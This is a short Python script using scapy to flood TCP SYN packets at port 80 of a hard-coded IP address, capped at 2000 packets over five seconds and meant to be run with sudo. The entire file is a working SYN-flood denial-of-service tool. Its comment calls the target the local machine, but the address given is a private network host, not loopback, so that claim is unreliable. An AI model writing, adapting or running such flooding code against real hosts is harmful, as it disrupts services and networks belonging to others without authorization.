import sys
import time
from scapy.all import IP, TCP, send

# Target is local machine (single-host simulation)
TARGET_IP = "10.229.171.152"

NUM_PACKETS = 2000
DURATION = 5

def send_packets(target_ip, num_packets, duration):
    packet = IP(dst=target_ip) / TCP(dport=80, flags='S')
    packet_count = 0
    end_time = time.time() + duration

    while time.time() < end_time and packet_count < num_packets:
        send(packet, verbose=False)   # Layer-3 send
        packet_count += 1

if __name__ == "__main__":
    if sys.version_info[0] < 3:
        print("Python 3 required")
        sys.exit(1)

    send_packets(TARGET_IP, NUM_PACKETS, DURATION)

# sudo python3 packet_flooder.py
